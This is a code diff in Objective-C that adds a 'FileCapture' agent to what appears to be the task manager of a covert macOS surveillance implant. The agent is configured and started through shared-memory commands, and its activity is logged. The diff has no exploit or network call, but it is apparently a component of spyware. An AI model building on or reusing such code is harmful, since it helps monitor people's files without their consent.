@@ -1145,11 +1145,89 @@ static NSLock *gSyncLock                  = nil;
           }
         break;
       }
+    case AGENT_FILECAPTURE:
+      {
+        agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+        agentConfiguration = [self getConfigForAgent: agentID];
+        [agentConfiguration retain];
+        
+        if ([agentConfiguration objectForKey: @"status"] != AGENT_RUNNING &&
+            [agentConfiguration objectForKey: @"status"] != AGENT_START)
+          {
+            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+            shMemoryHeader->agentID         = AGENT_INTERNAL_FILECAPTURE;
+            shMemoryHeader->direction       = D_TO_AGENT;
+            shMemoryHeader->command         = AG_START;
+            
+            BOOL success = [_logManager createLog: AGENT_FILECAPTURE_OPEN
+                                      agentHeader: nil
+                                        withLogID: 0];
+
+            if (success)
+              {
+                NSMutableData *fileConfig = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+                NSData *agentConf         = [agentConfiguration objectForKey: @"data"];
+
+                shMemoryLog *_fileConfig     = (shMemoryLog *)[fileConfig bytes];
+                _fileConfig->status          = SHMEM_WRITTEN;
+                _fileConfig->agentID         = AGENT_INTERNAL_FILECAPTURE;
+                _fileConfig->direction       = D_TO_AGENT;
+                _fileConfig->commandType     = CM_AGENT_CONF;
+                _fileConfig->commandDataSize = [agentConf length];
+
+                memcpy(_fileConfig->commandData,
+                       [agentConf bytes],
+                       [agentConf length]);
+
+                if ([gSharedMemoryLogging writeMemory: fileConfig
+                                               offset: 0
+                                        fromComponent: COMP_CORE] == TRUE)
+                  {
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Starting Agent FileCapture - conf sent");
+#endif
+
+                    if ([gSharedMemoryCommand writeMemory: agentCommand
+                                                   offset: OFFT_FILECAPTURE
+                                            fromComponent: COMP_CORE] == TRUE)
+                      {
+#ifdef DEBUG_TASK_MANAGER
+                        infoLog(@"Start command sent to Agent FileCapture", agentID);
+#endif
+                        [agentConfiguration setObject: AGENT_RUNNING
+                                               forKey: @"status"];
+                      }
+                    else
+                      {
+#ifdef DEBUG_TASK_MANAGER
+                        infoLog(@"An error occurred while starting agent FileCapture");
+#endif
+
+                        [agentCommand release];
+                        [agentConfiguration release];
+                        [fileConfig release];
+                        [outerPool release];
+                        return NO;
+                      }
+                  }
+
+                [fileConfig release];
+              }
+            else
+              {
+#ifdef DEBUG_TASK_MANAGER
+                errorLog(@"Error while initializing empty log for file capture");
+#endif
+              }
+          }
+        break;
+      }
     default:
       {
 #ifdef DEBUG_TASK_MANAGER
         infoLog(@"Unsupported agent: 0x%04x", agentID);
 #endif
+        [outerPool release];
         return NO;
       }
     }
@@ -2082,6 +2160,83 @@ static NSLock *gSyncLock                  = nil;
                                 
                 break;
               }
+            case AGENT_FILECAPTURE_OPEN:
+              {
+#ifdef DEBUG_TASK_MANAGER
+                infoLog(@"Starting File Capture");
+#endif
+                agentCommand        = [NSMutableData dataWithLength: sizeof(shMemoryCommand)];
+                agentConfiguration  = [[anObject objectForKey: @"data"] retain];
+
+                if ([agentConfiguration isKindOfClass: [NSString class]])
+                  {
+#ifdef DEBUG_TASK_MANAGER
+                    errorLog(@"Config not found");
+#endif
+                    break;
+                  }
+                else
+                  {
+#ifdef DEBUG_TASK_MANAGER
+                    infoLog(@"Found configuration for File Capture");
+#endif
+                    shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+                    shMemoryHeader->agentID         = AGENT_INTERNAL_FILECAPTURE;
+                    shMemoryHeader->direction       = D_TO_AGENT;
+                    shMemoryHeader->command         = AG_START;
+
+                    BOOL success = [_logManager createLog: AGENT_FILECAPTURE_OPEN
+                                              agentHeader: nil
+                                                withLogID: 0];
+
+                    if (success)
+                      {
+                        NSMutableData *fileConfig = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+
+                        shMemoryLog *_fileConfig     = (shMemoryLog *)[fileConfig bytes];
+                        _fileConfig->status          = SHMEM_WRITTEN;
+                        _fileConfig->agentID         = AGENT_INTERNAL_FILECAPTURE;
+                        _fileConfig->direction       = D_TO_AGENT;
+                        _fileConfig->commandType     = CM_AGENT_CONF;
+                        _fileConfig->commandDataSize = [agentConfiguration length];
+
+
+                        memcpy(_fileConfig->commandData,
+                               [agentConfiguration bytes],
+                               [agentConfiguration length]);
+
+                        if ([gSharedMemoryLogging writeMemory: fileConfig
+                                                       offset: 0
+                                                fromComponent: COMP_CORE] == TRUE)
+                          {
+#ifdef DEBUG_TASK_MANAGER
+                            infoLog(@"Starting Agent FileCapture - conf sent");
+#endif
+
+                            if ([gSharedMemoryCommand writeMemory: agentCommand
+                                                           offset: OFFT_FILECAPTURE
+                                                    fromComponent: COMP_CORE] == TRUE)
+                              {
+#ifdef DEBUG_TASK_MANAGER
+                                infoLog(@"Start command sent to Agent FileCapture", agentID);
+#endif
+                                [anObject setObject: AGENT_RUNNING
+                                             forKey: @"status"];
+                              }
+                          }
+
+                        [agentConfiguration release];
+                        [fileConfig release];
+                      }
+                    else
+                      {
+#ifdef DEBUG_TASK_MANAGER
+                        errorLog(@"Error while initializing empty log for file capture");
+#endif
+                      }
+                  }
+                break;
+              }
             default:
               break;
             }
@@ -2570,7 +2725,7 @@ static NSLock *gSyncLock                  = nil;
       while ([anObject objectForKey: @"status"] != EVENT_STOPPED
              && counter <= MAX_STOP_WAIT_TIME)
         {
-          sleep(1);
+          usleep(100000);
           counter++;
         }
       
